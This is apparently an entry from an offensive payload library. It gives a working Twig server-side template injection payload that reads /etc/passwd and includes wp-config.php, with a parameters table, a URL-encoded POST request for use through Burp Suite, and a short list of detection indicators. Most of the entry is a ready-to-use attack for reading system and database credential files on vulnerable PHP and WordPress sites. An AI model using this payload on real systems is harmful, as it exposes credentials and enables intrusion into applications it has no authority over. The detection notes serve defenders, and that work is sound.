---
id: 11b21bda-9479-411f-b0d2-f32e14ad06c4
type: code
language: twig
verified: true
created_at: '2023-04-06T03:56:40.335751+00:00'
updated_at: '2023-04-10T20:23:50.886721+00:00'
tags:
  - ssti
  - twig
  - file-read
  - payload
platforms:
  - Web
  - Linux
validated: true
---

# Twig-Arbitrary-File-Read-Payload

## Code

```twig
"{{'/etc/passwd'|file_excerpt(1,30)}}"@
{{include("wp-config.php")}}
```

## Description

This Twig template payload exploits Server-Side Template Injection (SSTI) to perform arbitrary file reading on a vulnerable PHP application. The 'file_excerpt' filter extracts the first 30 lines from /etc/passwd, revealing system user accounts, while the 'include' function loads the entire wp-config.php file, exposing WordPress database credentials. The '@' acts as a separator to prevent syntax conflicts in the output. This code is injected into user-controlled template variables and executed by the Twig engine.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| `/etc/passwd` | Path to the target file for line extraction | `/etc/passwd` (system users) |
| `1,30` | Start line and number of lines to extract | `1,30` (first 30 lines) |
| `wp-config.php` | Path to the file to include fully | `wp-config.php` (WordPress config) |

## Usage

Inject this payload into a vulnerable input point in a Twig-rendered PHP application, such as a search parameter or template variable (e.g., via HTTP POST: q=%7B%7B%27%2Fetc%2Fpasswd%27%7Cfile_excerpt(1%2C30)%7D%7D%40%0A%7B%7Binclude(%22wp-config.php%22)%7D%7D). Use a proxy like Burp Suite to encode and submit. The response will contain the file contents embedded in the rendered template output. Ideal for reconnaissance in red team engagements targeting misconfigured web apps.

## Detection

- Web application logs showing Twig runtime errors or unusual function calls (e.g., file_excerpt, include).
- File access logs (e.g., auditd on Linux) indicating reads of sensitive paths like /etc/passwd from the web server process (e.g., www-data).
- WAF alerts for template syntax in inputs ({{, |, }}).
- Anomalous response sizes or content containing file-like data (e.g., hashed passwords in /etc/passwd output).
- Network monitoring for repeated requests to the same endpoint with encoded payloads.

## Related

- [[procedures/Twig-Template-Injection-Arbitrary-File-Reading]]
